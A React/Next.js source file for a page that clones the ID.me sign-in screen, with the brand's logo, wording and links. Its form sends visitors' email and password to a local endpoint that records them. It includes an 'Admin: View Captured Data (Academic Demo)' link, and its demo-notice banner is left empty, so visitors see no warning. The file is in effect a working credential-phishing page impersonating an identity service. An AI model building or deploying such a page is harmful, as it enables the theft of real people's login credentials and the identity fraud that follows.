"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Eye, EyeOff, CheckCircle, AlertCircle } from "lucide-react";
import Link from "next/link";

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitMessage, setSubmitMessage] = useState<{type: 'success' | 'error', text: string} | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitMessage(null);

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
          rememberMe,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        setSubmitMessage({
          type: 'success',
          text: 'Login attempt recorded successfully!'
        });
        // Reset form
        setEmail("");
        setPassword("");
        setRememberMe(false);
      } else {
        setSubmitMessage({
          type: 'error',
          text: data.error || 'An error occurred'
        });
      }
    } catch (error) {
      setSubmitMessage({
        type: 'error',
        text: 'Network error - please try again'
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Academic Demo Notice */}
      <div className="bg-yellow-50 border-b border-yellow-200 px-4 py-2">
        <div className="max-w-md mx-auto text-center">
          
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          {/* ID.me Logo */}
          <div className="text-center mb-8">
            <img
              src="https://ext.same-assets.com/1949166237/975348835.svg"
              alt="ID.me"
              className="h-8 mx-auto"
            />
          </div>

          {/* Login Card */}
          <Card className="shadow-lg border-0">
            <CardHeader className="space-y-4 pb-4">
              <h1 className="text-2xl font-semibold text-center text-gray-900">
                Sign in to ID.me
              </h1>
              <div className="text-center">
                <span className="text-sm text-gray-600">New to ID.me? </span>
                <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">
                  Create an ID.me account
                </Link>
              </div>
            </CardHeader>

            <CardContent className="space-y-4">
              {/* Success/Error Messages */}
              {submitMessage && (
                <div className={`p-3 rounded-md flex items-center space-x-2 ${
                  submitMessage.type === 'success'
                    ? 'bg-green-50 text-green-800 border border-green-200'
                    : 'bg-red-50 text-red-800 border border-red-200'
                }`}>
                  {submitMessage.type === 'success' ? (
                    <CheckCircle className="h-4 w-4" />
                  ) : (
                    <AlertCircle className="h-4 w-4" />
                  )}
                  <span className="text-sm">{submitMessage.text}</span>
                </div>
              )}

              {/* Form */}
              <form className="space-y-4" onSubmit={handleSubmit}>
                {/* Email Field */}
                <div className="space-y-2">
                  <label htmlFor="email" className="text-sm font-medium text-gray-700">
                    Email*
                  </label>
                  <Input
                    id="email"
                    type="email"
                    placeholder="enter your email address"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full"
                    required
                    disabled={isSubmitting}
                  />
                </div>

                {/* Password Field */}
                <div className="space-y-2">
                  <label htmlFor="password" className="text-sm font-medium text-gray-700">
                    Password*
                  </label>
                  <div className="relative">
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      placeholder="enter password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full pr-10"
                      required
                      disabled={isSubmitting}
                    />
                    <button
                      type="button"
                      className="absolute inset-y-0 right-0 pr-3 flex items-center"
                      onClick={() => setShowPassword(!showPassword)}
                      disabled={isSubmitting}
                    >
                      {showPassword ? (
                        <EyeOff className="h-4 w-4 text-gray-400" />
                      ) : (
                        <Eye className="h-4 w-4 text-gray-400" />
                      )}
                    </button>
                  </div>
                </div>

                {/* Forgot Password Link */}
                <div className="text-right">
                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">
                    Forgot password?
                  </Link>
                </div>

                {/* Remember Me Checkbox */}
                <div className="flex items-start space-x-2">
                  <Checkbox
                    id="remember"
                    checked={rememberMe}
                    onCheckedChange={(checked) => setRememberMe(checked as boolean)}
                    className="mt-0.5"
                    disabled={isSubmitting}
                  />
                  <div className="space-y-0">
                    <label htmlFor="remember" className="text-sm font-medium text-gray-700">
                      Remember me
                    </label>
                    <p className="text-xs text-gray-500">
                      For your security, select only on your devices.
                    </p>
                  </div>
                </div>

                {/* Sign In Button */}
                <Button
                  type="submit"
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? "Signing in..." : "Sign in"}
                </Button>
              </form>

              {/* Social Media Notice */}
              <div className="mt-6 p-3 bg-gray-50 rounded text-center">
                <p className="text-xs text-gray-600">
                  Social media sign in is no longer available. Please sign in with your email.
                </p>
              </div>

              {/* Admin Access */}
              <div className="mt-4 pt-4 border-t border-gray-200">
                <div className="text-center">
                  <Link
                    href="/admin"
                    className="text-xs text-gray-500 hover:text-gray-700 underline"
                  >
                    Admin: View Captured Data (Academic Demo)
                  </Link>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>

      {/* Footer */}
      <footer className="py-6">
        <div className="text-center space-y-2">
          <div>
            <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">
              English
            </Link>
          </div>
          <div className="flex justify-center space-x-6 text-xs text-gray-600">
            <Link href="#" className="hover:text-gray-800 underline">
              What is ID.me?
            </Link>
            <Link href="#" className="hover:text-gray-800 underline">
              Terms of Service
            </Link>
            <Link href="#" className="hover:text-gray-800 underline">
              Privacy Policy
            </Link>
          </div>
        </div>
      </footer>
    </div>
  );
}
